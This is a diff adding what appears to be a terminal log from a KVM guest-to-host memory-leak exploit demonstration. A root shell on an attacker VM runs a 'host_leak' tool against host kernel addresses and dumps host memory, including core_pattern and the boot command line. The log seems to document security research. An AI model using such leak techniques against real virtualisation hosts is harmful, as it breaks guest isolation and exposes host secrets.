@@ -1,0 +1,104 @@
+Leaking the host’s core_pattern:
+
+root@debian9attackervm:/home/user/Downloads/full_kvm_exploit# cat /dev/shm/host_vmlinux_load_address 
+0xffffffffbc000000
+root@debian9attackervm:/home/user/Downloads/full_kvm_exploit# grep core_pattern /boot/System.map-4.9.0-3-amd64 
+ffffffff81c845e0 D core_pattern
+root@debian9attackervm:/home/user/Downloads/full_kvm_exploit# ./host_leak 0xffffffffbcc845e0 0x200
+[14:00:39] === starting host_leak ===
+[14:00:39] cold min: 228
+[14:00:40] hot avg: 33117824/999985 = 33
+[14:00:40] hot_cold_limit: 163
+[14:00:40] false hot: 0, false cold: 11 (each in 1000000)
+host-virtual kernel address for shared page: 0xffff8c2a51b38018
+[14:00:40] ########## LEAK RATE: 0/sec ##########
+[14:00:40] ffffffffbcc845e0  63 6f 72 65 00 00 00 00 00 00 00 00 00 00 00 00  |core............|
+[14:00:40] ffffffffbcc845f0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84600  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84610  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84620  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84630  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84640  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84650  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84660  a0 3c c8 bc ff ff ff ff 00 47 c8 bc ff ff ff ff  |.<.......G......|
+[14:00:40] ffffffffbcc84670  00 63 ce bc ff ff ff ff cd d0 a0 bc ff ff ff ff  |.c..............|
+[14:00:40] ffffffffbcc84680  a0 ab c7 bc ff ff ff ff 00 9a cc bc 7f ff ff ff  |................|
+[14:00:40] ffffffffbcc84690  30 47 c8 bc ff ff ff ff d0 3c c8 bc ff ff ff ff  |0G.......<......|
+[14:00:40] ffffffffbcc846a0  2b 03 00 00 00 00 00 00 20 be c5 bc ff ff ff ff  |+....... .......|
+[14:00:40] ffffffffbcc846b0  ee d5 9f bc ff ff ff ff 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc846c0  00 00 00 00 00 00 00 00 a0 47 c8 bc ff ff ff ff  |.........G......|
+[14:00:40] ffffffffbcc846d0  02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc846e0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc846f0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84700  60 46 c8 bc ff ff ff ff 20 48 c8 bc ff ff ff ff  |`F...... H......|
+[14:00:40] ffffffffbcc84710  60 63 ce bc ff ff ff ff e8 d0 a0 bc ff ff ff ff  |`c..............|
+[14:00:40] ffffffffbcc84720  40 ac c7 bc ff ff ff ff a0 9a cc bc ff ff ff ff  |@...............|
+[14:00:40] ffffffffbcc84730  50 48 c8 bc ff ff ff ff 90 46 c8 bc ff ff ff ff  |PH.......F......|
+[14:00:40] ffffffffbcc84740  2c 03 00 00 00 00 00 00 40 be c5 bc ff ff ff ff  |,.......@.......|
+[14:00:40] ffffffffbcc84750  00 d3 c1 ce 2a 8c ff ff 00 00 00 00 00 00 00 00  |....*...........|
+[14:00:40] ffffffffbcc84760  00 00 00 00 00 00 00 00 a0 47 c8 bc ff ff ff ff  |.........G......|
+[14:00:40] ffffffffbcc84770  02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84780  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc84790  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:00:40] ffffffffbcc847a0  04 d1 a0 bc ff ff ff ff 30 01 00 00 03 00 00 00  |........0.......|
+[14:00:40] ffffffffbcc847b0  00 48 c8 bc ff ff ff ff e0 47 c8 bc ff ff ff ff  |.H.......G......|
+[14:00:40] ffffffffbcc847c0  f0 73 6d ca 2a 8c ff ff 50 7a 6d ca 2a 8c ff ff  |.sm.*...Pzm.*...|
+[14:00:40] ffffffffbcc847d0  00 47 c8 bc ff ff ff ff 60 46 c8 bc ff ff ff ff  |.G......`F......|
+
+
+leaking the host’s saved_command_line (with pointer indirection):
+
+root@debian9attackervm:/home/user/Downloads/full_kvm_exploit# grep saved_command_line /boot/System.map-4.9.0-3-amd64 
+ffffffff81e89008 B saved_command_line
+root@debian9attackervm:/home/user/Downloads/full_kvm_exploit# ./host_leak 0xffffffffbce89008 0x10
+[14:08:41] === starting host_leak ===
+[14:08:41] cold min: 240
+[14:08:41] hot avg: 33143428/999986 = 33
+[14:08:41] hot_cold_limit: 171
+[14:08:42] false hot: 0, false cold: 16 (each in 1000000)
+host-virtual kernel address for shared page: 0xffff8c2a51b38018
+[14:08:42] ########## LEAK RATE: 0/sec ##########
+[14:08:42] ffffffffbce89008  00 f4 ff ef 2a 8c ff ff 00 00 00 00 00 00 00 00  |....*...........|
+root@debian9attackervm:/home/user/Downloads/full_kvm_exploit# ./host_leak 0xffff8c2aeffff400 0x200
+[14:09:08] === starting host_leak ===
+[14:09:09] cold min: 252
+[14:09:09] hot avg: 33099220/999991 = 33
+[14:09:09] hot_cold_limit: 179
+[14:09:09] false hot: 0, false cold: 31 (each in 1000000)
+host-virtual kernel address for shared page: 0xffff8c2a51b38018
+[14:09:09] ########## LEAK RATE: 0/sec ##########
+[14:09:09] ffff8c2aeffff400  42 4f 4f 54 5f 49 4d 41 47 45 3d 2f 62 6f 6f 74  |BOOT_IMAGE=/boot|
+[14:09:09] ffff8c2aeffff410  2f 76 6d 6c 69 6e 75 7a 2d 34 2e 39 2e 30 2d 33  |/vmlinuz-4.9.0-3|
+[14:09:09] ffff8c2aeffff420  2d 61 6d 64 36 34 20 72 6f 6f 74 3d 55 55 49 44  |-amd64 root=UUID|
+[14:09:09] ffff8c2aeffff430  3d 61 35 38 32 64 38 64 34 2d 63 39 39 61 2d 34  |=a582d8d4-c99a-4|
+[14:09:09] ffff8c2aeffff440  30 61 39 2d 61 62 39 36 2d 64 31 39 30 65 39 32  |0a9-ab96-d190e92|
+[14:09:09] ffff8c2aeffff450  35 65 66 38 33 20 72 6f 20 71 75 69 65 74 00 00  |5ef83 ro quiet..|
+[14:09:09] ffff8c2aeffff460  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff470  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff480  30 85 c4 bc ff ff ff ff c0 f4 ff ef 2a 8c ff ff  |0...........*...|
+[14:09:09] ffff8c2aeffff490  00 c0 0c 00 00 00 00 00 00 00 10 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff4a0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff4b0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff4c0  80 f4 ff ef 2a 8c ff ff 00 f5 ff ef 2a 8c ff ff  |....*.......*...|
+[14:09:09] ffff8c2aeffff4d0  ad a3 0c 00 00 00 00 00 d1 bf 0c 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff4e0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff4f0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff500  c0 f4 ff ef 2a 8c ff ff 40 f5 ff ef 2a 8c ff ff  |....*...@...*...|
+[14:09:09] ffff8c2aeffff510  a0 00 00 00 00 00 00 00 10 01 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff520  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff530  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff540  00 f5 ff ef 2a 8c ff ff 30 85 c4 bc ef ff ff ff  |....*...0.......|
+[14:09:09] ffff8c2aeffff550  00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff560  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff570  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff580  00 00 00 00 01 00 00 00 ff ff ff 2f 08 00 00 00  |.........../....|
+[14:09:09] ffff8c2aeffff590  1a 5c 9e bc ff ff ff ff d0 1d cd bc ff ff ff ff  |.\..............|
+[14:09:09] ffff8c2aeffff5a0  18 f6 ff ef 2a 8c ff ff 00 23 cb c5 2a 8c ff ff  |....*....#..*...|
+[14:09:09] ffff8c2aeffff5b0  00 c3 cc c5 2a 8c ff ff 30 f6 ff ef 2a 8c ff ff  |....*...0...*...|
+[14:09:09] ffff8c2aeffff5c0  18 c3 cc c5 2a 8c ff ff 00 c3 cc c5 2a 8c ff ff  |....*.......*...|
+[14:09:09] ffff8c2aeffff5d0  40 a8 ce bc ff ff ff ff f8 57 d1 c5 2a 8c ff ff  |@........W..*...|
+[14:09:09] ffff8c2aeffff5e0  01 00 00 00 03 00 00 00 00 00 00 00 00 00 00 00  |................|
+[14:09:09] ffff8c2aeffff5f0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+root@debian9attackervm:/home/user/Downloads/full_kvm_exploit# 
+
+
